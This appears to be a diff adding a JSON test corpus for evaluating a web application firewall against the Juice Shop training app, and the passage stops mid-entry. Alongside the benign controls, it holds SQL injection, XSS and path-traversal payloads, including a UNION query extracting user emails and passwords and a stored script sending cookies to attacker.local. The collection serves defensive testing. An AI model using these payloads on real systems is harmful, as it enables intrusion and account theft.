@@ -1,0 +1,3214 @@
+[
+  {
+    "test_id": "BENIGN-001",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Standard root index page request",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-002",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Benign search query for fruit product 'apple'",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-003",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "orange juice"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Benign search query containing spaced words 'orange juice'",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-004",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "banana & strawberry"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Benign search query with ampersand character",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-005",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Challenges/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "API call fetching challenges list",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-006",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/languages",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "REST endpoint retrieving supported UI languages",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-007",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/ftp/legal.md",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Legitimate file download of public legal notice",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-008",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/admin/application-version",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Public application metadata endpoint",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-009",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":\"testuser@example.com\",\"password\":\"SecureP@ssw0rd!\"}",
+    "description": "Benign login attempt with standard email and strong password",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-010",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"Great shopping experience, thanks!\",\"rating\":5}",
+    "description": "Benign feedback form submission with text and integer",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-011",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/assets/public/favicon_js.ico",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Static favicon asset retrieval",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-012",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "100% natural organic"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search query containing percentage character used in benign context",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-013",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "O'Reilly"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing an apostrophe (common false-positive trigger)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-014",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "juice 100% natural"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing a percent sign",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-015",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "café crème"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with non-ASCII Unicode characters",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-016",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "select fruit"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Natural English word 'select' in a search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-017",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple-banana mix"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Hyphenated search term",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-018",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "C# sticker"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing a hash sign",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-019",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 or 2 bottles"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Natural phrase containing the word 'or'",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-020",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "lemon (organic)"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with parentheses",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-021",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\"green smoothie\""
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with double quotes",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-022",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "price: 2.99/l"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with colon and slash",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-023",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "melon; kiwi"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search with semicolon separator",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-024",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "bestseller 2026"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Alphanumeric search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-025",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "t-shirt size=XL"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Search containing an equals sign",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-026",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Products/1",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Product detail by id",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-027",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/1/reviews",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Product reviews listing",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-028",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/Quantitys/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Stock quantity listing",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-031",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/admin/application-configuration",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Public application configuration",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-032",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/api/SecurityQuestions/",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Security question list used by registration",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-033",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/memories",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Photo wall listing",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-034",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/assets/public/images/products/apple_juice.jpg",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Static product image",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-035",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/assets/i18n/en.json",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Translation bundle",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-036",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/robots.txt",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "robots.txt",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-037",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {},
+    "body": {
+      "email": "customer@example.com",
+      "password": "Sunny-Day-2026"
+    },
+    "description": "Normal JSON login (invalid credentials expected)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-038",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Great taste, I'd buy again! 5/5",
+      "rating": 5
+    },
+    "description": "Feedback with apostrophe and slash",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-039",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Delivery took 2-3 days; packaging was fine.",
+      "rating": 4
+    },
+    "description": "Feedback with semicolon",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-040",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "comment": "Not bad (a bit sweet) - would prefer less sugar.",
+      "rating": 3
+    },
+    "description": "Feedback with parentheses",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-041",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/api/Users/",
+    "params": {},
+    "headers": {},
+    "body": {
+      "email": "new.user+shop@example.com",
+      "password": "Blue-Kettle-77",
+      "passwordRepeat": "Blue-Kettle-77"
+    },
+    "description": "Registration with plus-addressed email",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-042",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple"
+    },
+    "headers": {
+      "Accept-Language": "de-DE,de;q=0.9,en;q=0.8"
+    },
+    "body": null,
+    "description": "Search with realistic Accept-Language header",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "SQLI-001",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "' OR '1'='1"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Classic tautology boolean-based SQL injection",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-002",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 UNION SELECT NULL,NULL,NULL--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "UNION-based SQL injection with multi-column null probe and comment",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-003",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Juice Shop specific SQLite schema extraction via UNION injection",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-004",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":\"' OR 1=1--\",\"password\":\"irrelevant\"}",
+    "description": "Authentication bypass via SQL injection in JSON email field",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-005",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/rest/user/login",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"any\"}",
+    "description": "SQL injection admin comment bypass in login payload",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-006",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "apple'; WAITFOR DELAY '0:0:5'--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Time-based blind SQL injection attempt using WAITFOR syntax",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-007",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1 AND 1=CONVERT(int, @@version)"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Error-based SQL injection with database function query",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-008",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1' OR (SELECT COUNT(*) FROM sqlite_master)>0--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Subquery injection targeting SQLite catalog tables",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-009",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test' OR pg_sleep(5)--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Postgres-style time-based injection payload",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "SQLI-010",
+    "category": "sqli",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "1' ORDER BY 10--"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Order by column enumeration probe",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "XSS-001",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/",
+    "params": {
+      "q": "<script>alert('XSS-1')</script>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Reflected XSS with direct script tag execution",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-002",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<img src=x onerror=alert(document.domain)>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Event handler injection via broken image tag onerror",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-003",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<svg onload=alert(1)>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "SVG vector with onload event handler",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-004",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<iframe src=\"javascript:alert('XSS')\">"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Iframe injection executing javascript pseudo-protocol",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-005",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "POST",
+    "path": "/api/Feedbacks/",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "body": "{\"comment\":\"<script>fetch('http://attacker.local/?c='+document.cookie)</script>\",\"rating\":1}",
+    "description": "Stored XSS payload targeting cookie exfiltration in comment body",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "XSS-006",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "\"><script src=//evil.site/payload.js></script>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Attribute breakout leading to remote script inclusion",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-007",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<body onpageshow=alert(1)>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Body tag event handler injection",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-008",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<input autofocus onfocus=alert(1)>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Autofocus input element triggering onfocus automatically",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-009",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "<a href=\"javascript:alert(1)\">ClickMe</a>"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Anchor tag with javascript pseudo-protocol link",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "XSS-010",
+    "category": "xss",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "{{constructor.constructor('alert(1)')()}}"
+    },
+    "headers": {},
+    "body": null,
+    "description": "AngularJS client-side template injection (CSTI) vector",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "pattern_only"
+  },
+  {
+    "test_id": "TRAV-001",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/../../../../etc/passwd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Standard directory traversal attempting to read /etc/passwd",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-002",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "URL-encoded directory traversal targeting /etc/passwd",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-003",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/..%252f..%252f..%252fetc%252fpasswd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Double URL-encoded traversal probe",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-004",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/eastere.gg%2500.md",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Poison null byte injection attempting file extension bypass",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-005",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/assets/public/images/../../../../windows/win.ini",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Windows style traversal probe for win.ini",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-006",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/..%5c..%5c..%5cetc%5cpasswd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Backslash encoded traversal sequence",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-007",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/....//....//etc/passwd",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Nested traversal sequence designed to defeat simple strip filters",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "TRAV-008",
+    "category": "path-traversal",
+    "expected_class": "malicious",
+    "method": "GET",
+    "path": "/ftp/%2e%2e%2f%2e%2e%2fpackage.json",
+    "params": {},
+    "headers": {},
+    "body": null,
+    "description": "Fully encoded dot-dot-slash sequence seeking application root package.json",
+    "expected_waf_behavior": "block",
+    "scenario_applicability": "sink_present"
+  },
+  {
+    "test_id": "BENIGN-043",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "green smoothie"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Ordinary multi-word search without quotes",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-044",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": null,
+    "description": "X-Forwarded-For header as sent by any reverse proxy (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-045",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": null,
+    "description": "GET with an allowed Content-Type and no body (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-046",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "Accept": "*/*"
+    },
+    "body": null,
+    "description": "Wildcard Accept header, curl's default (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-047",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "User-Agent": "WAF-Research-Test/1.0"
+    },
+    "body": null,
+    "description": "Non-browser research User-Agent (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-048",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-Forwarded-Proto": "http"
+    },
+    "body": null,
+    "description": "X-Forwarded-Proto header set by TLS-terminating proxies (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-049",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "test"
+    },
+    "headers": {
+      "X-Request-ID": "waf-test-001"
+    },
+    "body": null,
+    "description": "Client-supplied correlation id header (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-050",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "POST",
+    "path": "/rest/products/search",
+    "params": {},
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><root>WAF_TEST</root>",
+    "description": "Well-formed XML body without DOCTYPE or entities (relabelled: benign)",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-051",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "echo dot speaker"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Shell builtin word 'echo' in a product search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-052",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "salt & pepper | 2 pack"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Ampersand and pipe in natural text",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-053",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "php elephant plush"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Word 'php' in a product search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-054",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "java coffee beans"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Word 'java' in a product search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-055",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "$5 voucher"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Dollar sign in natural text",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-056",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "etc. accessories"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Abbreviation 'etc.' in a search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-057",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "file organizer"
+    },
+    "headers": {},
+    "body": null,
+    "description": "Word 'file' in a search",
+    "expected_waf_behavior": "allow",
+    "scenario_applicability": "benign_control"
+  },
+  {
+    "test_id": "BENIGN-058",
+    "category": "normal",
+    "expected_class": "benign",
+    "method": "GET",
+    "path": "/rest/products/search",
+    "params": {
+      "q": "xml mug"
+    },
+    "headers": {},
+    "body": null,
